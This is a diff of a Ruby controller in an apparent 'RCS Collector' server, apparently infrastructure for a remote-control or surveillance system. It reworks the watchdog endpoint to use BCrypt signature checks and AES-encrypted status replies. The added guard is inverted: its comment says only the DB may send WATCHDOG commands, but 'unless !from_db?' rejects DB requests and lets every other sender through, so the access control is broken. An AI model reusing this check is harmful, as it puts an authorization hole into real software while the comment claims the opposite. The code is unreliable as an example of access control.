@@ -1,9 +1,11 @@
 require_relative 'sync_protocol'
 
 require 'rcs-common/mime'
+require 'rcs-common/crypt'
 
 require 'resolv'
 require 'socket'
+require 'bcrypt'
 
 require 'zip'
 require 'zip/filesystem'
@@ -12,7 +14,8 @@ module RCS
 module Collector
 
 class CollectorController < RESTController
-  
+  include RCS::Crypt
+
   def get
     return bad_request unless @request[:uri].start_with?('/')
 
@@ -104,14 +107,15 @@ class CollectorController < RESTController
   end
 
   def watchdog
-    trace :debug, "#{@request[:peer]} watchdog #{$watchdog.locked?} [#{@request[:uri]}]"
-    @request[:uri].gsub!("/", '')
-    return ok("#{$external_address} #{DB.instance.check_signature} #{$version}", {content_type: "text/html"}) if @request[:uri].eql? 'CHECK'
-    return method_not_allowed if @request[:uri] != @request[:peer]
-    return ok("#{$version}", {content_type: "text/html"}) if $watchdog.lock
-  end
+    # only the DB is authorized to send WATCHDOG commands
+    unless !from_db?(@request[:headers])
+      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send WATCHDOG [#{@request[:uri]}] commands!!!"
+      return method_not_allowed
+    end
 
-  private
+    # reply to the periodic heartbeat request
+    return watchdog_request(@request)
+  end
 
   private
 
@@ -372,6 +376,16 @@ class CollectorController < RESTController
 
     return server_error(resp.body) unless resp.kind_of? Net::HTTPSuccess
     return ok(resp.body, {content_type: 'text/html'})
+  end
+
+  def watchdog_request(request)
+    # authenticate with crc signature
+    return method_not_allowed if BCrypt::Password.new(DB.instance.crc_signature) != @request[:uri].gsub("/", '')
+    # decrypt the request
+    command = aes_decrypt(request[:content], DB.instance.sha1_signature)
+    # send the response
+    return ok(aes_encrypt("#{Time.now.getutc.to_f} #{$version} #{$external_address} #{DB.instance.check_signature}", DB.instance.sha1_signature), {content_type: "application/octet-stream"}) if command.eql? 'status'
+    return ok(aes_encrypt("#{DB.instance.check_signature}", DB.instance.sha1_signature), {content_type: "application/octet-stream"}) if command.eql? 'check' and $watchdog.lock
   end
 
   def from_db?(headers)
